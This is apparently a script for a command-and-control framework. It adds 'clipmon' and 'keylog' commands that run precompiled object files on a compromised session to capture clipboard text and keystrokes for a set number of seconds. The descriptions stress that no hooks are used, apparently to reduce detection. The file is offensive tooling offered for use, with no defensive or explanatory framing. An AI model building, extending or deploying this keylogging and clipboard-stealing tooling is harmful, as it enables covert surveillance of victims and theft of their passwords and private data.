var metadata = {
    name: "Capture-BOF",
    description: "In-process input capture (clipboard watch + keystroke poll); own-process only, no hooks"
};

// ---------- clipmon ----------
var cmd_clipmon = ax.create_command("clipmon", "Poll-capture clipboard text in-process (no hooks); repeat with 0 to stop+flush", "clipmon 60");
cmd_clipmon.addArgFlagInt("-secs", "secs", "Capture window seconds; 0 = stop a running capture", "60");
cmd_clipmon.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let secs = parseInt(parsed_json["secs"] || "60", 10); if (isNaN(secs)) secs = 60;
    let bof_params = ax.bof_pack("int", [secs]);
    let bof_path = ax.script_dir() + "_bin/clipmon." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: clipmon " + (secs ? "start" : "stop") + " " + secs + "s");
});

// ---------- keylog ----------
var cmd_keylog = ax.create_command("keylog", "In-process keystroke capture (GetAsyncKeyState poll, no hooks); 0 = stop+flush", "keylog 60");
cmd_keylog.addArgFlagInt("-secs", "secs", "Capture window seconds; 0 = stop a running capture", "60");
cmd_keylog.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let secs = parseInt(parsed_json["secs"] || "60", 10); if (isNaN(secs)) secs = 60;
    let bof_params = ax.bof_pack("int", [secs]);
    let bof_path = ax.script_dir() + "_bin/keylog." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: keylog " + (secs ? "start" : "stop") + " " + secs + "s");
});